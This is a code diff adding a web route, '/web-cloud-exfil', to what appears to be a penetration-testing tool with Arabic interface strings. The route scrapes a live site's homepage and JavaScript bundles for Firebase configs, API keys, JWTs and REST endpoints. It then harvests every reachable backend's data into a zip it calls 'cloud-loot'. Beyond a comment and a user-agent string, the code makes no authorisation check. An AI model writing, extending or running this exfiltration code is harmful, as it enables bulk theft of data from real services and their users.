@@ -749,6 +749,93 @@ router.post("/cloud-exfil", async (req: Request, res: Response) => {
 });
 
 
+// Web equivalent of /cloud-exfil: harvest cloud identifiers + REST endpoints
+// from a LIVE web target (homepage + same-origin JS bundles), then pull & zip
+// every reachable backend's complete contents. Authorized use only.
+router.post("/web-cloud-exfil", async (req: Request, res: Response) => {
+  extendTimeout(req, res, 600_000);
+  const { target } = req.body as { target: string };
+  if (!target) { res.status(400).json({ error: "target مطلوب" }); return; }
+  try {
+    const base = target.includes("://") ? target : `https://${target}`;
+    let host = ""; let origin = "";
+    try { const u = new URL(base); host = u.host; origin = u.origin; } catch { res.status(400).json({ error: "هدف غير صالح" }); return; }
+
+    const UA = "Mozilla/5.0 (compatible; HAYO-Ethical-Pentest/2.0; +authorized-scan)";
+    const grab = async (u: string): Promise<string> => {
+      const ctrl = new AbortController();
+      const t = setTimeout(() => ctrl.abort(), 12000);
+      try { const r = await fetch(u, { headers: { "User-Agent": UA }, signal: ctrl.signal }); return (await r.text().catch(() => "")).slice(0, 800_000); }
+      catch { return ""; } finally { clearTimeout(t); }
+    };
+
+    const { scanTextSecrets } = await import("../hayo/pentest/secretsDeep.js");
+    const { exfiltrateAllCloudData } = await import("../hayo/pentest/cloudExfil.js");
+
+    const homeHtml = await grab(base);
+    const blobs: Array<{ text: string; location: string }> = [{ text: homeHtml, location: base }];
+    // Same-origin (or relative) JS bundles — likely to hold the Firebase config + REST base URLs.
+    const scriptUrls = [...homeHtml.matchAll(/<script[^>]+src=["']([^"']+)["']/gi)].map((m) => m[1])
+      .filter((s) => !/^https?:\/\//i.test(s) || s.startsWith(origin))
+      .slice(0, 12).map((s) => (s.startsWith("http") ? s : `${origin}${s.startsWith("/") ? "" : "/"}${s}`));
+    for (const su of scriptUrls) { const js = await grab(su); if (js) blobs.push({ text: js, location: su }); }
+
+    const deep = scanTextSecrets(blobs, { entropy: false, ignore: ["sourceMappingURL", "webpack", "React"] });
+    // Explicit Firebase config regexes from the page (scanTextSecrets may miss inline config).
+    for (const b of blobs) {
+      const db = b.text.match(/https:\/\/[a-z0-9\-]+\.firebaseio\.com/i)?.[0]
+        || b.text.match(/https:\/\/[a-z0-9\-]+\.firebasedatabase\.app/i)?.[0];
+      const pid = b.text.match(/"projectId"\s*:\s*"([a-z0-9\-]+)"/i)?.[1];
+      const bucket = b.text.match(/"storageBucket"\s*:\s*"([a-z0-9\-.]+)"/i)?.[1];
+      if (db) deep.cloud.dbUrls.add(db);
+      if (pid) deep.cloud.projectIds.add(pid);
+      if (bucket) deep.cloud.buckets.add(bucket);
+    }
+
+    // REST endpoints: same-origin API-ish URLs + absolute https URLs from the blobs.
+    const restSet = new Set<string>();
+    for (const b of blobs) {
+      for (const m of b.text.matchAll(/["'`](\/(?:api|v\d+|graphql|rest|auth|user|account|orders?|data|admin)\/[A-Za-z0-9_\-/{}:.?=&]*)["'`]/gi)) {
+        try { restSet.add(new URL(m[1], origin).toString()); } catch { /* */ }
+      }
+      for (const m of b.text.matchAll(/https?:\/\/[a-z0-9.\-]+\/(?:api|v\d+|graphql|rest)\/[A-Za-z0-9._~:/?#@!$&'()*+,;=%\-]{0,120}/gi)) {
+        restSet.add(m[0].split("#")[0]);
+      }
+    }
+    const restEndpoints = [...restSet].slice(0, 40);
+    const restKeys = [...new Set([
+      ...deep.cloud.apiKeys, ...deep.cloud.jwts,
+      ...(deep.candidateSecrets || []).filter((s: string) => /^[A-Za-z0-9_\-]{16,60}$/.test(s)).slice(0, 20),
+    ])];
+
+    const discovery = {
+      apiKeys: deep.cloud.apiKeys.size, dbUrls: deep.cloud.dbUrls.size, projectIds: deep.cloud.projectIds.size,
+      firebaseBuckets: deep.cloud.buckets.size, s3Buckets: deep.cloud.s3Buckets.size,
+      restEndpoints: restEndpoints.length, restKeys: restKeys.length,
+    };
+    console.log(`[web-cloud-exfil] host=${host} discovery=${JSON.stringify(discovery)}`);
+
+    const result = await exfiltrateAllCloudData(deep.cloud, host, { endpoints: restEndpoints, keys: restKeys });
+
+    let downloadId: string | undefined;
+    if (result.ok && result.zipPath) {
+      downloadId = `dl_exfil_${Date.now()}`;
+      uploadStore.set(downloadId, { filePath: result.zipPath, fileName: `cloud-loot-${host}.zip`, uploadedAt: Date.now() });
+    }
+    const log = [...result.log];
+    if (!result.ok) {
+      log.unshift(`فُحص: ${discovery.apiKeys} مفتاح · ${discovery.dbUrls} RTDB · ${discovery.projectIds} Firestore · ${discovery.firebaseBuckets + discovery.s3Buckets} تخزين · ${discovery.restEndpoints} نقطة REST (بـ ${discovery.restKeys} مفتاح)`);
+    }
+    res.json({
+      success: result.ok, downloadId,
+      totalFiles: result.totalFiles, totalBytes: result.totalBytes, zipBytes: result.zipBytes,
+      backends: result.backends, authUsed: result.authUsed, files: result.files.slice(0, 500),
+      discovery, log, error: result.error,
+    });
+  } catch (e: any) { res.status(500).json({ error: e.message }); }
+});
+
+
 router.post("/deep-firebase-audit", upload.single("file"), async (req: Request, res: Response) => {
   extendTimeout(req, res, 600_000);
   if (!req.file) { res.status(400).json({ error: "ارفع ملف APK أولاً" }); return; }
